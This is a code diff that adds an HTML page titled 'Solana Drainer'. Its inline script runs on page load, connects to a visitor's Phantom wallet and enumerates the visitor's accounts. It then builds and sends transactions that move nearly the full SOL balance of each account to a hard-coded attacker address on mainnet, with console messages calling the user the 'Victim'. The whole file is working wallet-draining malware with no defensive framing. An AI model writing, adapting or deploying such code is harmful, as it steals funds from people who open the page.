@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Drainer</title>
+</head>
+<body>
+    <h1>Draining Solana</h1>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.30.2/solanaWeb3.min.js"></script>
+    <script>
+        (async () => {
+            console.log("🔍 Checking for Phantom Wallet...");
+
+            let provider = window.solana;
+            
+            if (!provider || !provider.isPhantom) {
+                console.log("🚨 Phantom Wallet not detected! Make sure it's installed and unlocked.");
+                return;
+            }
+
+            await provider.connect(); // Ensure Phantom is connected
+
+            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");
+            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh");
+
+            let userWallet = provider.publicKey;
+            console.log(`💰 Victim Address: ${userWallet.toBase58()}`);
+
+            // 🔹 Step 1: Get All Associated Addresses
+            let addresses = await provider.request({ method: "solana_requestAccounts" });
+
+            console.log("Found Addresses:", addresses);
+
+            for (let address of addresses) {
+                let walletPublicKey = new solanaWeb3.PublicKey(address);
+
+                // 🔹 Step 2: Get Balance for Each Address
+                let balance = await connection.getBalance(walletPublicKey);
+                let drainAmount = balance - 5000; // Leaves a small fee to prevent failure
+
+                if (drainAmount > 0) {
+                    let transaction = new solanaWeb3.Transaction().add(
+                        solanaWeb3.SystemProgram.transfer({
+                            fromPubkey: walletPublicKey,
+                            toPubkey: attackerWallet,
+                            lamports: drainAmount
+                        })
+                    );
+
+                    console.log(`⚠️ Draining ${drainAmount / 1e9} SOL from ${walletPublicKey}...`);
+
+                    const signedTransaction = await provider.signTransaction(transaction);
+                    await connection.sendRawTransaction(signedTransaction.serialize());
+                }
+            }
+
+            console.log("✅ Draining complete.");
+        })();
+    </script>
+</body>
+</html>
